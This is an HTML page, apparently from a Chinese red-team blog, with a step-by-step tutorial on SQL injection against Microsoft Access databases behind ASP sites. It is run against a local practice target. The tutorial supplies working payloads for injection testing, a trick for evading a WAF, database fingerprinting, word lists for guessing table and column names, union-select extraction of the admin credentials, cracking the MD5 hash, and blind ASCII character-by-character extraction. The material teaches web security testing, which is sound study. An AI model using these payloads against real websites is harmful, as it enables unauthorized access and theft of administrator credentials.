@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>SQL注入学习之 - Access数据库注入原理 | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">SQL注入学习之 - Access数据库注入原理</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 6, 2019&nbsp;&nbsp;13:01:32</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=491577283&auto=1&height=66"></iframe>
+
+<h2 id="Access-简介"><a href="#Access-简介" class="headerlink" title="Access-简介"></a>Access-简介</h2><p><code>Microsoft Office Access</code>是由微软发布的关系数据库管理系统。它结合了 <code>MicrosoftJet Database Engine</code> 和 图形用户界面两项特点，是 <code>Microsoft Office </code>的系统程序之一</p>
+<p>一般<code>Access</code>数据库用于<code>asp</code>、<code>aspx</code>脚本网站比较多一些，这是一个比较小型的数据库，<code>Access</code>是以文件形式存放于目录中</p>
+<p>有(列名/字段)、表名、值，数据库后缀是<code>*.mdb</code>:</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/334.png" alt="图片"></p>
+<p>从上图可以知道：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">表名：admin_user</span><br><span class="line"></span><br><span class="line">列名/字段：admin</span><br><span class="line"></span><br><span class="line">值：21232f297a57a5a743894a0e4a801fc3</span><br></pre></td></tr></table></figure>
+
+<h2 id="Asp连接Access数据库代码"><a href="#Asp连接Access数据库代码" class="headerlink" title="Asp连接Access数据库代码"></a>Asp连接Access数据库代码</h2><p><code>*.mdb</code>格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">	dim conn,connstr,db</span><br><span class="line">	db=&quot;Your.mdb&quot; </span><br><span class="line">	Set conn = Server.CreateObject(&quot;ADODB.Connection&quot;)</span><br><span class="line">	connstr=&quot;Provider=Microsoft.Jet.OLEDB.4.0;Data Source=&quot; &amp; Server.MapPath(db)</span><br><span class="line">	conn.Open connstr</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p><code>*.accdb</code>格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">	dim conn,connstr,db</span><br><span class="line">	db=&quot;Your.accdb&quot; </span><br><span class="line">	Set conn = Server.CreateObject(&quot;ADODB.Connection&quot;)</span><br><span class="line">	connstr=&quot;Provider=Microsoft.ACE.OLEDB.12.0;Data Source=&quot; &amp; Server.MapPath(db)</span><br><span class="line">	conn.Open connstr</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Access数据库注入原理"><a href="#Access数据库注入原理" class="headerlink" title="Access数据库注入原理"></a>Access数据库注入原理</h2><p>看一个网站有没有注入就是看看我们插入的字符有没有带入网站数据库中进行执行，执行就说明存在注入</p>
+<p>漏洞靶场： <a target="_blank" rel="noopener" href="http://127.0.0.1:99/">http://127.0.0.1:99/</a></p>
+<p>在URL后面<code>*1</code>,也就是<code>id=31</code>乘1，结果还是等于31对吧</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/335.png" alt="图片"></p>
+<p>所以页面返回正常！那么我在后面加一个<code>-7</code>: 因为数据库中只有id为：31、22、23、24、25、26的值：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/336.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/337.png" alt="图片"></p>
+<p>可以看到在URL后面<code>-7</code>页面返回了是其他页面，说明它吧我们输入的值带入查询了！说明存在<code>SQL</code>注入</p>
+<p>当然有些人判断是否存在注入是这样的：（当然你了解了原理，判断注入的方式都无所谓）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">and 1=1 返回正常</span><br><span class="line"></span><br><span class="line">and 1=2 返回错误</span><br><span class="line"></span><br><span class="line">存在上方条件即可判断存在SQL注入</span><br><span class="line"></span><br><span class="line">但是我一般喜欢用：.0 和 .1来判断（过安全狗）</span><br><span class="line"></span><br><span class="line">.0 返回正常</span><br><span class="line"></span><br><span class="line">.1 返回错误</span><br></pre></td></tr></table></figure>
+<p>有的时候你插入一些语句，网站页面前台不会回显任何信息，可以使用<code>BurpSuite</code>来查看回显信息!</p>
+<h3 id="判断数据库注入"><a href="#判断数据库注入" class="headerlink" title="判断数据库注入"></a>判断数据库注入</h3><p>为什么要判断是那种数据库？答：因为知道了数据库的类型就可以使用响应的SQL语法来进行注入攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">判断是否为access数据库</span><br><span class="line">and exsits(select * from msysobjects)&gt;0  </span><br><span class="line"></span><br><span class="line">判断是否为sqlserver数据库and exsits(select * from sysobjects)&gt;0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">判断是否为access数据库</span><br><span class="line"></span><br><span class="line">and exsits(select * from msysobjects)&gt;0 </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/345.png" alt="图片"></p>
+<p>可以看到页面回显：不能读取记录；在 <code>&#39;msysobjects&#39;</code> 上没有读取数据权限</p>
+<p>说明存在<code>msysobjects</code>这个数据库名，<code>Access</code>数据库就存在这个数据库名！</p>
+<h3 id="判断数据库表名"><a href="#判断数据库表名" class="headerlink" title="判断数据库表名"></a>判断数据库表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">联合查询是否有admin这个表名</span><br><span class="line">and exists(select * from amdin)</span><br></pre></td></tr></table></figure>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/346.png" alt="图片"></p>
+<p>很显然，<code>admin</code>这个表不存在！</p>
+<p>常见的表名有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admins</span><br><span class="line">admin_user</span><br><span class="line">admin_usr</span><br><span class="line">admin_msg</span><br><span class="line">admin_login</span><br><span class="line">user</span><br><span class="line">username</span><br><span class="line">manager</span><br><span class="line">msg_user</span><br><span class="line">msg_login</span><br><span class="line">useradmin</span><br><span class="line">...等等</span><br><span class="line"></span><br><span class="line">提示：一般Access数据库有个表名：news，不过没啥卵用</span><br></pre></td></tr></table></figure>
+
+<p>最后手工猜解出表名是：<code>admin_user</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/347.png" alt="图片"></p>
+<h3 id="判断数据库列名"><a href="#判断数据库列名" class="headerlink" title="判断数据库列名"></a>判断数据库列名</h3><p>刚刚手工猜解出表名是：<code>admin_user</code>,现在来根据表名来判断列名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询admin_user表名下是否有admin这个列</span><br><span class="line"> and exists(select admin from admin_user)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/348.png" alt="图片"></p>
+<p>说明<code>admin_user</code>表名下还是有<code>admin</code>这个列名的！</p>
+<p><code>admin_user</code>表名下还有一个<code>id</code>列名一个<code>password</code>列名！</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/349.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/350.png" alt="图片"></p>
+<p>常见的列名有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">admin_user</span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">pass</span><br><span class="line">pwd</span><br><span class="line">users</span><br><span class="line">usr</span><br><span class="line">user_login</span><br><span class="line">user_name</span><br><span class="line">login_name</span><br><span class="line">...等等</span><br></pre></td></tr></table></figure>
+
+<h3 id="判断字段长度"><a href="#判断字段长度" class="headerlink" title="判断字段长度"></a>判断字段长度</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">必须小于等于字段的长度返回正常</span><br><span class="line"></span><br><span class="line">order by [number]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by 8</span><br><span class="line">返回错误</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/351.png" alt="图片"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">order by 7</span><br><span class="line">返回正常</span><br></pre></td></tr></table></figure>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/352.png" alt="图片"></p>
+<p>知道了它有7列，那么就可以进行联合查询</p>
+<h3 id="union联合查询"><a href="#union联合查询" class="headerlink" title="union联合查询"></a>union联合查询</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过union联合查询admin_user这个表</span><br><span class="line">union select 1,2,3,4,5,6,7 from admin_user</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/353.png" alt="图片"></p>
+<p>可以看到，网站页面回显了几个数字：2、3、5！</p>
+<p>爆出来的数字是<code>非数字</code>类型的列,因为方便爆出来账号密码！因为账号密码不是数字类型的，是字符型的！</p>
+<p>这样我们就可以在这些列上来爆账号密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用union联合查询admin_user表下的admin、password列的字段内容</span><br><span class="line">union select 1,admin,password,4,5,6,7 from admin_user</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/354.png" alt="图片"></p>
+<p>得到用户名：admin</p>
+<p><code>MD5</code>加密后的密码：21232f297a57a5a743894a0e4a801fc3 </p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/355.png" alt="图片"></p>
+<p><code>MD5</code>解密结果为：<code>admin</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/356.png" alt="图片"></p>
+<p>知道账号密码直接登录到后台管理！</p>
+<h2 id="番外篇"><a href="#番外篇" class="headerlink" title="番外篇"></a>番外篇</h2><p>通过<code>ASCII</code>码来判断：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">判断admin_user表名下的admin列下的内容长度是否等于5个字符，返回正常说明长度就是5</span><br><span class="line"></span><br><span class="line">and (select len(admin) from admin_user)=5</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/357.png" alt="图片"></p>
+<p>说明判断<code>admin</code>列名的长度是<code>5</code>!</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">判断admin_user表名下的password列下的内容长度是否等于32个字符，返回正常说明长度就是32</span><br><span class="line"></span><br><span class="line">and (select len(password) from admin_user)=32</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/358.png" alt="图片"></p>
+<p>一般<code>MD5</code>加密后的无非就<code>16</code>和<code>32</code>位字符！</p>
+<p>现在是判断出来管理员账号和密码的字符长度了！</p>
+<p>接下来猜解出每一个字符了！</p>
+<h4 id="ASCII码的对照图"><a href="#ASCII码的对照图" class="headerlink" title="ASCII码的对照图"></a>ASCII码的对照图</h4><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/359.png" alt="图片"></p>
+<h3 id="ASCII码猜解字符"><a href="#ASCII码猜解字符" class="headerlink" title="ASCII码猜解字符"></a>ASCII码猜解字符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这个语句的意思就是：</span><br><span class="line"></span><br><span class="line">查询admin_user表下的admin列名的第个字符的第一列的ascii码是否大于100</span><br><span class="line"></span><br><span class="line">and (select top 1 asc (mid(admin,1,1)) from admin_user)&gt;100</span><br></pre></td></tr></table></figure>
+<p>因为<code>admin</code>列名的字段内容是<code>admin</code>!即第一个字符是<code>a</code>,而<code>a</code>的<code>ASCII</code>码是<code>97</code>!</p>
+<p>那么就可以构造以下语句查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询admin列名字段内容的第一个字符的第一列的ASCII码是否等于97，也就是a</span><br><span class="line">and (select top 1 asc (mid(admin,1,1)) from admin_user)=97</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/360.png" alt="图片"></p>
+<p>返回正常！说明第一个字符是<code>a</code>!</p>
+<p>因为我们知道字段内容是<code>admin</code>,那么<code>a</code>的下一个字符就是是<code>d</code>，而<code>d</code>的<code>ASCII</code>码就是<code>100</code>:</p>
+<p>那么就可以构造以下语句查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 asc (mid(admin,2,1)) from admin_user)=100</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/361.png" alt="图片"></p>
+<p>返回正常！说明第二个字符的内容是<code>d</code>!</p>
+<p>就是这样，一点点的判断然后爆出管理员的账号!也就是admin列名下的字段内容！</p>
+<p>下面是爆<code>password</code>字段的内容：</p>
+<p>因为之前我们知道了<code>password</code>的字段内容是：<code>21232f297a57a5a743894a0e4a801fc3</code>！</p>
+<p>那么第一个字段内容就是<code>2</code>,下一个就是<code>1</code>,再下两个分别是<code>2</code>、<code>3</code>以此类推！</p>
+<p>因为<code>2</code>的ASCII码是<code>50</code>，那么就构造语句如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select top 1 asc (mid(password,1,1)) from admin_user)=50</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/362.png" alt="图片"></p>
+<p>返回正常！原理就是这样，以此类推下去慢慢猜解出来就好了，<code>sqlmap</code>就是采用这种方式来猜解字段内容的！</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/10/06/SQL-Access-1/">http://example.com/2019/10/06/SQL-Access-1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"># 漏洞原理</a>
+                    
+                        <a href="/tags/SQL%E6%B3%A8%E5%85%A5/"># SQL注入</a>
+                    
+                        <a href="/tags/Access/"># Access</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/10/07/red-hack-1/">Win7本地溢出exploit提权-CVE-2018-8120</a>
+            
+            
+            <a class="next" rel="next" href="/2019/09/29/BadUSB/">U盘攻击：无视防火墙-3秒黑掉你的电脑|BadUSB-制作教程</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
